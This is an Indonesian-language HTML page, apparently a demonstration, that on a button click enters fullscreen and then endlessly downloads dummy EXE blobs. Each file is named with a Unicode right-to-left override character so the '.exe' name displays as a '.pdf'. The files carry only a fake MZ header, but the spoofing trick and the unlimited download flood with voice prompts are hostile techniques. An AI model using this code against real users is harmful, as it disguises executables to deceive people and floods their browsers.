<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Generator Berkas Blob & ObjectURL</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      color: #222;
      padding: 20px;
    }
    .panel {
      background: #ffffff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      margin: 40px auto;
    }
    /* Tampilan Fullscreen */
    :fullscreen {
      background: #111111 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
      width: 100vw !important;
      height: 100vh !important;
    }
    :-webkit-full-screen {
      background: #111111 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
    }
    h2 {
      margin-bottom: 10px;
    }
    p {
      margin-bottom: 15px;
      line-height: 1.5;
    }
    button {
      width: 100%;
      padding: 16px;
      cursor: pointer;
      border: none;
      border-radius: 6px;
      background: #d32f2f;
      color: #ffffff;
      font-weight: bold;
      font-size: 16px;
      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
      transition: background 0.2s;
    }
    button:hover {
      background: #b71c1c;
    }
    #status {
      margin-top: 16px;
      font-weight: bold;
      color: #d32f2f;
      padding: 12px;
      background: #ffebee;
      border-radius: 6px;
      text-align: center;
      border: 1px solid #ffcdd2;
    }
    #downloads {
      margin-top: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
      gap: 10px;
    }
    #downloads a {
      display: block;
      padding: 8px;
      background: #212121;
      color: #f59e0b; /* Warna oranye menandakan spoofing karakter tingkat lanjut */
      text-decoration: none;
      border-radius: 4px;
      font-size: 11px;
      text-align: center;
      border: 1px solid #424242;
      word-break: break-all;
    }
  </style>
</head>

<body>
  <div class="panel" id="main-panel">
    <h2>Uji Advanced Spoofing: Unicode RLO Attack</h2>
    <p>Klik tombol untuk memicu pengunduhan berkas .EXE biner yang disamarkan menggunakan pembalikan karakter Unicode RLO sehingga tampak seperti file .PDF asli di sistem operasi.</p>

    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji Spoofing RLO</button>

    <div id="status" role="status">Sistem siap.</div>
    <div id="downloads"></div>
  </div>

  <script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");
    const downloadsDiv = document.getElementById("downloads");

    let activeUrls = [];
    let isProcessing = false;

    // Fungsi Sintesis Suara (TTS)
    const speak = (message) => {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        utterance.rate = 1.0;
        window.speechSynthesis.speak(utterance);
      }
    };

    // Fungsi menyusun struktur data biner tiruan EXE (Header MZ) di memori
    const prepareMimeBlobAsync = (i) => {
      return new Promise((resolve) => {
        queueMicrotask(() => {
          const mzHeader = [0x4D, 0x5A]; 
          const payloadText = `\x00\x00\x00\x00This program cannot be run in DOS mode.\r\n$Simulasi_RLO_Spoofing_Ke_${i}`;
          
          const encoder = new TextEncoder();
          const textBytes = encoder.encode(payloadText);
          
          const fileBytes = new Uint8Array(mzHeader.length + textBytes.length);
          fileBytes.set(mzHeader, 0);
          fileBytes.set(textBytes, mzHeader.length);
          
          const blob = new Blob([fileBytes], { type: "application/x-msdownload" });
          const url = URL.createObjectURL(blob);
          resolve({ id: i, url: url });
        });
      });
    };

    // Memicu unduhan dengan menyuntikkan karakter Unicode RLO (\u202E)
    const triggerInstantDownload = (fileData) => {
      const link = document.createElement("a");
      link.href = fileData.url;
      
      // LOGIKA SPOOFING RLO:
      // Teks target di memori: "laporan_ke_1_fdp.exe"
      // Disuntik RLO sebelum kata 'fdp', menjadi: "laporan_ke_1_" + "\u202E" + "fdp.exe"
      // Ketika dibaca sistem, "fdp.exe" akan dibalik arah tulisannya menjadi "exe.pdf"
      const baseName = `laporan_ke_${fileData.id}_`;
      const rloCharacter = "\u202E";
      const spoofExtension = "fdp.exe"; // 'fdp' dibalik menjadi 'pdf'
      
      // Nama asli di sistem tetap berakhiran .exe, namun visual pengguna menjadi .pdf
      link.download = baseName + rloCharacter + spoofExtension;
      link.textContent = `File #${fileData.id} (Spoofed)`;
      
      downloadsDiv.appendChild(link);
      link.click();
    };

    // Perulangan Rekursif Asynchronous
    const processLoop = async (counter) => {
      if (!isProcessing) return;

      const fileData = await prepareMimeBlobAsync(counter);
      activeUrls.push(fileData.url);
      
      triggerInstantDownload(fileData);

      statusDiv.textContent = `Proses Berjalan: File RLO Spoof ke-${counter} dikirim`;

      if (counter % 10 === 0) {
        speak(`Proses mencapai ${counter} berkas.`);
      }

      setTimeout(() => processLoop(counter + 1), 0);
    };

    // Event Handler Tombol
    startBtn.addEventListener("click", () => {
      if (isProcessing) return;

      activeUrls.forEach(url => URL.revokeObjectURL(url));
      activeUrls = [];
      downloadsDiv.replaceChildren();

      speak("Mengaktifkan mode layar penuh.");

      const root = document.documentElement;
      try {
        if (root.requestFullscreen) {
          root.requestFullscreen();
        } else if (root.webkitRequestFullscreen) {
          root.webkitRequestFullscreen();
        } else if (root.mozRequestFullScreen) {
          root.mozRequestFullScreen();
        }
        statusDiv.textContent = "Mengunci layar penuh...";
      } catch (err) {
        console.warn("Fullscreen tidak didukung atau ditolak:", err);
      }

      setTimeout(() => {
        isProcessing = true;
        speak("Proses pengujian advanced spoofing dimulai.");
        processLoop(1);
      }, 300);
    });

    const stopProcess = () => {
      if (isProcessing) {
        isProcessing = false;
        statusDiv.textContent = "Proses dihentikan (Keluar dari Layar Penuh).";
        speak("Proses dihentikan.");
        activeUrls.forEach(url => URL.revokeObjectURL(url));
        activeUrls = [];
      }
    };

    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement) stopProcess();
    });
    document.addEventListener('webkitfullscreenchange', () => {
      if (!document.webkitIsFullScreen) stopProcess();
    });
  </script>
</body>
</html>
